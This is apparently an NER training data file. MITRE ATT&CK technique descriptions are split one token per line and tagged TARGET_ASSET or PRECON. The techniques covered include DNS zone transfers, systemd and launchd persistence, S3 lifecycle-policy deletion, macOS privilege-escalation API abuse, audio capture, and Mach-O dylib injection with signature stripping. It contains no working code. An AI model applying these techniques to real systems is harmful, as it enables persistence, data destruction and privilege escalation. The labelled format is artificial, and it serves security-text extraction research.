as O
querying O
or O
otherwise O
collecting O
details O
via O
[DNS/Passive B-TARGET_ASSET
DNS](https://attack.mitre.org/techniques/T1596/001) I-TARGET_ASSET
. O 

DNS B-TARGET_ASSET
information I-TARGET_ASSET
may O
also O
be O
exposed B-PRECON
to O
adversaries O
via O
online O
or O
other O
accessible O
data O
sets O
(ex: O
[Search O
Open O
Technical O
Databases](https://attack.mitre.org/techniques/T1596)) O
. O 

(Citation: O
DNS O
Dumpster)(Citation: O
Circl O
Passive O
DNS) O
Gathering O
this O
information O
may O
reveal O
opportunities O
for O
other O
forms O
of O
reconnaissance O
(ex: O
[Search O
Open O
Technical O
Databases](https://attack.mitre.org/techniques/T1596) O
, O
[Search O
Open O
Websites/Domains](https://attack.mitre.org/techniques/T1593) O
, O
or O
[Active O
Scanning](https://attack.mitre.org/techniques/T1595)) O
, O
establishing O
operational O
resources O
(ex: O
[Acquire O
Infrastructure](https://attack.mitre.org/techniques/T1583) O
or O
[Compromise O
Infrastructure](https://attack.mitre.org/techniques/T1584)) O
, O
and/or O
initial O
access O
(ex: O
[External O
Remote O
Services](https://attack.mitre.org/techniques/T1133)) O
. O 


Adversaries O
may O
also O
use O
DNS B-TARGET_ASSET
zone I-TARGET_ASSET
transfer I-TARGET_ASSET
(DNS O
query O
type O
AXFR) O
to O
collect O
all O
records B-TARGET_ASSET
from O
a O
misconfigured B-PRECON
DNS B-TARGET_ASSET
server I-TARGET_ASSET
. O 

(Citation: O
Trails-DNS)(Citation: O
DNS-CISA)(Citation: O
Alexa-dns) O

Systemd B-TARGET_ASSET
services I-TARGET_ASSET
can O
be O
used O
to O
establish O
persistence O
on O
a O
Linux O
system B-TARGET_ASSET
. O 

The O
systemd B-TARGET_ASSET
service I-TARGET_ASSET
manager I-TARGET_ASSET
is O
commonly O
used O
for O
managing O
background O
daemon B-TARGET_ASSET
processes I-TARGET_ASSET
(also O
known O
as O
services B-TARGET_ASSET
) O
and O
other O
system B-TARGET_ASSET
resources I-TARGET_ASSET
. O 

(Citation: O
Linux O
man-pages: O
systemd O
January O
2014)(Citation: O
Freedesktop.org O
Linux O
systemd O
29SEP2018) O
Systemd B-TARGET_ASSET
is O
the O
default B-PRECON
initialization I-PRECON
( I-PRECON
init I-PRECON
) I-PRECON
system I-TARGET_ASSET
on O
many O
Linux O
distributions O
starting O
with O
Debian O
8, O
Ubuntu O
15.04, O
CentOS O
7, O
RHEL O
7, O
Fedora O
15, O
and O
replaces O
legacy O
init B-TARGET_ASSET
systems I-TARGET_ASSET
including O
SysVinit B-TARGET_ASSET
and O
Upstart B-TARGET_ASSET
while O
remaining O
backwards B-PRECON
compatible I-PRECON
with I-PRECON
the I-PRECON
aforementioned I-PRECON
init I-PRECON
systems I-TARGET_ASSET
. O 


Systemd B-TARGET_ASSET
utilizes O
configuration B-TARGET_ASSET
files I-TARGET_ASSET
known O
as O
service B-TARGET_ASSET
units I-TARGET_ASSET
to O
control O
how O
services B-TARGET_ASSET
boot O
and O
under O
what O
conditions O
. O 

By O
default O
, O
these O
unit B-TARGET_ASSET
files I-TARGET_ASSET
are O
stored B-PRECON
in O
the O
<code>/etc/systemd/system</code> O
and O
<code>/usr/lib/systemd/system</code> O
directories O
and O
have O
the O
file O
extension O
<code>.service</code> O
. O 

Each O
service B-TARGET_ASSET
unit I-TARGET_ASSET
file I-TARGET_ASSET
may O
contain O
numerous O
directives O
that O
can O
execute O
system O
commands O
. O 


* O
ExecStart, O
ExecStartPre, O
and O
ExecStartPost O
directives O
cover O
execution O
of O
commands O
when O
a O
services B-TARGET_ASSET
is O
started O
manually O
by O
'systemctl' O
or O
on O
system O
start O
if O
the O
service B-TARGET_ASSET
is O
set B-PRECON
to I-PRECON
automatically I-PRECON
start I-PRECON
. O 

* O
ExecReload O
directive O
covers O
when O
a O
service B-TARGET_ASSET
restarts O
. O 

* O
ExecStop O
and O
ExecStopPost O
directives O
cover O
when O
a O
service B-TARGET_ASSET
is O
stopped O
or O
manually O
by O
'systemctl' O
. O 


Adversaries O
have O
used O
systemd B-TARGET_ASSET
functionality O
to O
establish O
persistent O
access O
to O
victim O
systems B-TARGET_ASSET
by O
creating O
and/or O
modifying O
service B-TARGET_ASSET
unit I-TARGET_ASSET
files I-TARGET_ASSET
that O
cause O
systemd B-TARGET_ASSET
to O
execute O
malicious O
commands O
at O
recurring O
intervals O
, O
such O
as O
at O
system O
boot O
. O 

(Citation: O
Anomali O
Rocke O
March O
2019)(Citation: O
gist O
Arch O
package O
compromise O
10JUL2018)(Citation: O
Arch O
Linux O
Package O
Systemd O
Compromise O
BleepingComputer O
10JUL2018)(Citation: O
acroread O
package O
compromised O
Arch O
Linux O
Mail O
8JUL2018) O

While O
adversaries O
typically O
require O
root O
privileges O
to O
create/modify O
service B-TARGET_ASSET
unit I-TARGET_ASSET
files I-TARGET_ASSET
in O
the O
<code>/etc/systemd/system</code> O
and O
<code>/usr/lib/systemd/system</code> O
directories O
, O
low O
privilege O
users O
can O
create/modify O
service B-TARGET_ASSET
unit I-TARGET_ASSET
files I-TARGET_ASSET
in O
directories O
such O
as O
<code>~/.config/systemd/user/</code> O
to O
achieve O
user-level O
persistence O
. O 

(Citation: O
Rapid7 O
Service O
Persistence O
22JUNE2016) O

Adversaries O
may O
modify O
the O
lifecycle B-TARGET_ASSET
policies I-TARGET_ASSET
of O
a O
cloud B-TARGET_ASSET
storage I-TARGET_ASSET
bucket I-TARGET_ASSET
to O
destroy O
all O
objects B-TARGET_ASSET
stored O
within O
. O 


Cloud B-TARGET_ASSET
storage I-TARGET_ASSET
buckets I-TARGET_ASSET
often O
allow O
users O
to O
set O
lifecycle B-TARGET_ASSET
policies I-TARGET_ASSET
to O
automate O
the O
migration O
, O
archival O
, O
or O
deletion O
of O
objects B-TARGET_ASSET
after O
a O
set O
period O
of O
time O
. O 

(Citation: O
AWS O
Storage O
Lifecycles)(Citation: O
GCP O
Storage O
Lifecycles)(Citation: O
Azure O
Storage O
Lifecycles) O
If O
a O
threat O
actor O
has O
sufficient B-PRECON
permissions I-PRECON
to O
modify O
these O
policies B-TARGET_ASSET
, O
they O
may O
be O
able O
to O
delete O
all O
objects B-TARGET_ASSET
at O
once O
. O 


For O
example O
, O
in O
AWS B-TARGET_ASSET
environments I-TARGET_ASSET
, O
an O
adversary O
with O
the O
`PutLifecycleConfiguration` O
permission O
may O
use O
the O
`PutBucketLifecycle` B-TARGET_ASSET
API I-TARGET_ASSET
call I-TARGET_ASSET
to O
apply O
a O
lifecycle B-TARGET_ASSET
policy I-TARGET_ASSET
to O
an O
S3 B-TARGET_ASSET
bucket I-TARGET_ASSET
that O
deletes O
all O
objects B-TARGET_ASSET
in O
the O
bucket B-TARGET_ASSET
after O
one O
day O
. O 

(Citation: O
Palo O
Alto O
Cloud O
Ransomware)(Citation: O
Halcyon O
AWS O
Ransomware O
2025) O
In O
addition O
to O
destroying O
data B-TARGET_ASSET
for O
purposes O
of O
extortion O
and O
[Financial O
Theft](https://attack.mitre.org/techniques/T1657) O
, O
adversaries O
may O
also O
perform O
this O
action O
on O
buckets B-TARGET_ASSET
storing O
cloud B-TARGET_ASSET
logs I-TARGET_ASSET
for O
[Indicator O
Removal](https://attack.mitre.org/techniques/T1070) O
. O 

(Citation: O
Datadog O
S3 O
Lifecycle O
CloudTrail O
Logs) O

Adversaries O
may O
leverage O
the O
AuthorizationExecuteWithPrivileges B-TARGET_ASSET
API I-TARGET_ASSET
to O
escalate O
privileges O
by O
prompting O
the O
user O
for O
credentials O
. O 

(Citation: O
AppleDocs O
AuthorizationExecuteWithPrivileges) O
The O
purpose O
of O
this O
API B-TARGET_ASSET
is O
to O
give O
application O
developers O
an O
easy O
way O
to O
perform O
operations O
with O
root O
privileges O
, O
such O
as O
for O
application O
installation O
or O
updating O
. O 

This O
API B-TARGET_ASSET
does O
not O
validate O
that O
the O
program B-TARGET_ASSET
requesting O
root O
privileges O
comes O
from O
a O
reputable O
source O
or O
has O
been O
maliciously O
modified O
. O 

Although O
this O
API B-TARGET_ASSET
is O
deprecated B-PRECON
, O
it O
still O
fully O
functions O
in O
the O
latest O
releases O
of O
macOS O
. O 

When O
calling O
this O
API B-TARGET_ASSET
, O
the O
user O
will O
be O
prompted O
to O
enter O
their O
credentials O
but O
no O
checks O
on O
the O
origin O
or O
integrity O
of O
the O
program B-TARGET_ASSET
are O
made O
. O 

The O
program B-TARGET_ASSET
calling O
the O
API B-TARGET_ASSET
may O
also O
load O
world B-PRECON
writable I-PRECON
files B-TARGET_ASSET
which O
can O
be O
modified O
to O
perform O
malicious O
behavior O
with O
elevated O
privileges O
. O 


Adversaries O
may O
abuse O
AuthorizationExecuteWithPrivileges B-TARGET_ASSET
to O
obtain O
root O
privileges O
in O
order O
to O
install O
malicious O
software B-TARGET_ASSET
on O
victims O
and O
install O
persistence O
mechanisms O
. O 

(Citation: O
Death O
by O
1000 O
installers; O
it's O
all O
broken!)(Citation: O
Carbon O
Black O
Shlayer O
Feb O
2019)(Citation: O
OSX O
Coldroot O
RAT) O
This O
technique O
may O
be O
combined O
with O
[Masquerading](https://attack.mitre.org/techniques/T1036) O
to O
trick O
the O
user O
into O
granting O
escalated O
privileges O
to O
malicious O
code O
. O 

(Citation: O
Death O
by O
1000 O
installers; O
it's O
all O
broken!)(Citation: O
Carbon O
Black O
Shlayer O
Feb O
2019) O
This O
technique O
has O
also O
been O
shown O
to O
work O
by O
modifying O
legitimate O
programs B-TARGET_ASSET
present O
on O
the O
machine O
that O
make O
use O
of O
this O
API B-TARGET_ASSET
. O 

(Citation: O
Death O
by O
1000 O
installers; O
it's O
all O
broken!) O

An O
adversary O
can O
leverage O
a O
computer's O
peripheral B-TARGET_ASSET
devices I-TARGET_ASSET
(e.g., O
microphones B-TARGET_ASSET
and O
webcams B-TARGET_ASSET
) O
or O
applications B-TARGET_ASSET
(e.g., O
voice O
and O
video O
call O
services B-TARGET_ASSET
) O
to O
capture O
audio B-TARGET_ASSET
recordings I-TARGET_ASSET
for O
the O
purpose O
of O
listening O
into O
sensitive O
conversations O
to O
gather O
information O
. O 

(Citation: O
ESET O
Attor O
Oct O
2019) O

Malware B-TARGET_ASSET
or O
scripts B-TARGET_ASSET
may O
be O
used O
to O
interact O
with O
the O
devices B-TARGET_ASSET
through O
an O
available B-PRECON
API B-TARGET_ASSET
provided O
by O
the O
operating B-TARGET_ASSET
system I-TARGET_ASSET
or O
an O
application B-TARGET_ASSET
to O
capture O
audio B-TARGET_ASSET
. O 

Audio B-TARGET_ASSET
files I-TARGET_ASSET
may O
be O
written O
to O
disk B-TARGET_ASSET
and O
exfiltrated O
later O
. O 


Adversaries O
may O
create O
or O
modify O
system-level B-TARGET_ASSET
processes I-TARGET_ASSET
to O
repeatedly O
execute O
malicious O
payloads B-TARGET_ASSET
as O
part O
of O
persistence O
. O 

When O
operating B-TARGET_ASSET
systems I-TARGET_ASSET
boot O
up O
, O
they O
can O
start O
processes B-TARGET_ASSET
that O
perform O
background O
system O
functions O
. O 


On O
Windows O
and O
Linux O
, O
these O
system B-TARGET_ASSET
processes I-TARGET_ASSET
are O
referred O
to O
as O
services B-TARGET_ASSET
. O 

(Citation: O
TechNet O
Services) O
On O
macOS O
, O
launchd B-TARGET_ASSET
processes I-TARGET_ASSET
known O
as O
[Launch B-TARGET_ASSET
Daemon](https://attack.mitre.org/techniques/T1543/004) I-TARGET_ASSET
and O
[Launch B-TARGET_ASSET
Agent](https://attack.mitre.org/techniques/T1543/001) I-TARGET_ASSET
are O
run O
to O
finish O
system O
initialization O
and O
load O
user O
specific O
parameters O
. O 

(Citation: O
AppleDocs O
Launch O
Agent O
Daemons) O

Adversaries O
may O
install O
new O
services B-TARGET_ASSET
, O
daemons B-TARGET_ASSET
, O
or O
agents B-TARGET_ASSET
that O
can O
be O
configured B-PRECON
to I-PRECON
execute I-PRECON
at I-PRECON
startup I-PRECON
or O
a O
repeatable O
interval O
in O
order O
to O
establish O
persistence O
. O 

Similarly O
, O
adversaries O
may O
modify O
existing O
services B-TARGET_ASSET
, O
daemons B-TARGET_ASSET
, O
or O
agents B-TARGET_ASSET
to O
achieve O
the O
same O
effect O
. O 

Services B-TARGET_ASSET
, O
daemons B-TARGET_ASSET
, O
or O
agents B-TARGET_ASSET
may O
be O
created O
with O
administrator O
privileges O
but O
executed O
under O
root/SYSTEM O
privileges O
. O 

Adversaries O
may O
leverage O
this O
functionality O
to O
create O
or O
modify O
system B-TARGET_ASSET
processes I-TARGET_ASSET
in O
order O
to O
escalate O
privileges O
. O 

(Citation: O
OSX O
Malware O
Detection) O

Adversaries O
may O
leverage O
external-facing B-PRECON
remote B-TARGET_ASSET
services I-TARGET_ASSET
to O
initially O
access O
and/or O
persist O
within O
a O
network B-TARGET_ASSET
. O 

Remote O
services B-TARGET_ASSET
such O
as O
VPNs B-TARGET_ASSET
, O
Citrix B-TARGET_ASSET
, O
and O
other O
access O
mechanisms B-TARGET_ASSET
allow O
users O
to O
connect O
to O
internal O
enterprise O
network B-TARGET_ASSET
resources I-TARGET_ASSET
from O
external O
locations O
. O 

There O
are O
often O
remote O
service B-TARGET_ASSET
gateways I-TARGET_ASSET
that O
manage O
connections O
and O
credential O
authentication O
for O
these O
services B-TARGET_ASSET
. O 

Services B-TARGET_ASSET
such O
as O
[Windows B-TARGET_ASSET
Remote I-TARGET_ASSET
Management](https://attack.mitre.org/techniques/T1021/006) I-TARGET_ASSET
and O
[VNC](https://attack.mitre.org/techniques/T1021/005) B-TARGET_ASSET
can O
also O
be O
used O
externally O
. O 

(Citation: O
MacOS O
VNC O
software O
for O
Remote O
Desktop) O

Access O
to O
[Valid O
Accounts](https://attack.mitre.org/techniques/T1078) O
to O
use O
the O
service B-TARGET_ASSET
is O
often O
a O
requirement O
, O
which O
could O
be O
obtained O
through O
credential O
pharming O
or O
by O
obtaining O
the O
credentials B-TARGET_ASSET
from O
users O
after O
compromising O
the O
enterprise O
network B-TARGET_ASSET
. O 

(Citation: O
Volexity O
Virtual O
Private O
Keylogging) O
Access O
to O
remote B-TARGET_ASSET
services I-TARGET_ASSET
may O
be O
used O
as O
a O
redundant O
or O
persistent O
access O
mechanism O
during O
an O
operation O
. O 

Access O
may O
also O
be O
gained O
through O
an O
exposed B-PRECON
service B-TARGET_ASSET
that O
doesn’t O
require O
authentication O
. O 

In O
containerized O
environments B-TARGET_ASSET
, O
this O
may O
include O
an O
exposed B-PRECON
Docker B-TARGET_ASSET
API I-TARGET_ASSET
, O
Kubernetes B-TARGET_ASSET
API I-TARGET_ASSET
server I-TARGET_ASSET
, O
kubelet B-TARGET_ASSET
, O
or O
web B-TARGET_ASSET
application I-TARGET_ASSET
such O
as O
the O
Kubernetes B-TARGET_ASSET
dashboard I-TARGET_ASSET
. O 

(Citation: O
Trend O
Micro O
Exposed O
Docker O
Server)(Citation: O
Unit O
42 O
Hildegard O
Malware) O

Some O
adversaries O
may O
employ O
sophisticated O
means O
to O
compromise O
computer B-TARGET_ASSET
components I-TARGET_ASSET
and O
install O
malicious O
firmware B-TARGET_ASSET
that O
will O
execute O
adversary O
code O
outside O
of O
the O
operating B-TARGET_ASSET
system I-TARGET_ASSET
and O
main O
system B-TARGET_ASSET
firmware I-TARGET_ASSET
or O
BIOS B-TARGET_ASSET
. O 

This O
technique O
may O
be O
similar O
to O
[System B-TARGET_ASSET
Firmware](https://attack.mitre.org/techniques/T1019) I-TARGET_ASSET
but O
conducted O
upon O
other O
system B-TARGET_ASSET
components I-TARGET_ASSET
that O
may O
not O
have O
the O
same O
capability O
or O
level O
of O
integrity O
checking O
. O 

Malicious O
device B-TARGET_ASSET
firmware I-TARGET_ASSET
could O
provide O
both O
a O
persistent O
level O
of O
access O
to O
systems B-TARGET_ASSET
despite O
potential O
typical O
failures O
to O
maintain O
access O
and O
hard O
disk O
re-images O
, O
as O
well O
as O
a O
way O
to O
evade O
host O
software-based O
defenses O
and O
integrity O
checks O
. O 


Adversaries O
may O
establish O
persistence O
by O
executing O
malicious O
content O
triggered O
by O
the O
execution O
of O
tainted B-PRECON
binaries B-TARGET_ASSET
. O 

Mach-O B-TARGET_ASSET
binaries I-TARGET_ASSET
have O
a O
series O
of O
headers B-TARGET_ASSET
that O
are O
used O
to O
perform O
certain O
operations O
when O
a O
binary B-TARGET_ASSET
is O
loaded O
. O 

The O
LC_LOAD_DYLIB B-TARGET_ASSET
header I-TARGET_ASSET
in O
a O
Mach-O B-TARGET_ASSET
binary I-TARGET_ASSET
tells O
macOS O
and O
OS O
X O
which O
dynamic B-TARGET_ASSET
libraries I-TARGET_ASSET
( I-TARGET_ASSET
dylibs I-TARGET_ASSET
) O
to O
load O
during O
execution O
time O
. O 


These O
can O
be O
added O
ad-hoc O
to O
the O
compiled O
binary B-TARGET_ASSET
as O
long O
as O
adjustments O
are O
made O
to O
the O
rest O
of O
the O
fields O
and O
dependencies O
. O 
 

(Citation: O
Writing O
Bad O
Malware O
for O
OSX) O
There O
are O
tools O
available O
to O
perform O
these O
changes O
. O 


Adversaries O
may O
modify O
Mach-O B-TARGET_ASSET
binary I-TARGET_ASSET
headers I-TARGET_ASSET
to O
load O
and O
execute O
malicious O
dylibs B-TARGET_ASSET
every O
time O
the O
binary B-TARGET_ASSET
is O
executed O
. O 

Although O
any O
changes O
will O
invalidate O
digital O
signatures O
on O
binaries B-TARGET_ASSET
because O
the O
binary B-TARGET_ASSET
is O
being O
modified B-PRECON
, O
this O
can O
be O
remediated O
by O
simply O
removing O
the O
LC_CODE_SIGNATURE B-TARGET_ASSET
command I-TARGET_ASSET
from O
the O
binary B-TARGET_ASSET
so O
that O
the O
signature O
isn’t O
checked O
at O
load O
time O
. O 

(Citation: O
Malware O
Persistence O
on O
OS O
X) O